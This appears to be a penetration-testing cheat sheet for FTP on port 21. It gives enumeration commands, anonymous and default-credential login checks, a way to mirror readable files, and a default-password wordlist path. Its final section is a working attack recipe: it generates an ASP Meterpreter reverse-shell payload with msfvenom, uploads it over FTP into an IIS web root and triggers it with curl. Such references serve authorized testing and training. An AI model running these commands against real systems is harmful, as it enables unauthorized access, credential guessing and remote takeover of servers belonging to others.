---
title: 21 - FTP
type: service
tab: Services
ports: [21]
service: FTP
tools: [ftp, nc, nmap, nxc]
inputs: [Username, Password]
outputs: [Banner, Files, Password]
tags: [FTP, Enumeration, Exploitation]
---

# 21 - FTP

`21/tcp open ftp`

## Quick Notes

- Always try anonymous login.
- Common anonymous creds: `anonymous:anonymous`, `anonymous:<blank>`, `ftp:ftp`.

## Commands

### Quick Checks

#FTP #Enumeration
Quick anonymous and unauthenticated FTP checks.

```sh
# Interactive FTP login.
ftp <TARGET_IP>

# Grab the FTP banner quickly.
nc -vn <TARGET_IP> 21

# Open FTP in a browser.
ftp://<TARGET_IP>

# Find FTP-related Nmap scripts and run them.
ls -lh /usr/share/nmap/scripts/ | grep ftp
nmap <TARGET_IP> -p 21 -sV --script=<SCRIPT1>,<SCRIPT2>

# Fingerprint FTP with NetExec.
nxc ftp <TARGET_IP>
```

### Anonymous / Default Checks

#FTP #Enumeration
Try anonymous/default FTP credentials before using known creds.

```sh
# Common anonymous/default check.
nxc ftp <TARGET_IP> -u 'anonymous' -p ''

# Mirror all anonymously readable files.
wget -m ftp://anonymous:anonymous@<TARGET_IP>/
```

### Credentialed Checks

#Username #Password #FTP #Enumeration
Validate known FTP credentials.

```sh
# Test known credentials.
nxc ftp <TARGET_IP> -u <USER> -p '<PASS>'
```

### FTP Web Shell Upload

#Username #Password #FTP #HTTP #Windows #Exploitation
Upload an ASP payload over FTP when the FTP root maps to an IIS web path.

```sh
# Attacker: generate ASP Meterpreter payload.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o /tmp/revshell.asp

# FTP session: login with <USER>/<PASS>, then upload the payload.
ftp <TARGET_IP>
put /tmp/revshell.asp revshell.asp

# Trigger via HTTP.
curl "http://<TARGET_IP>/revshell.asp"
```

### Wordlists

#FTP #Enumeration
Default FTP credential wordlist reference.

```text
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
```
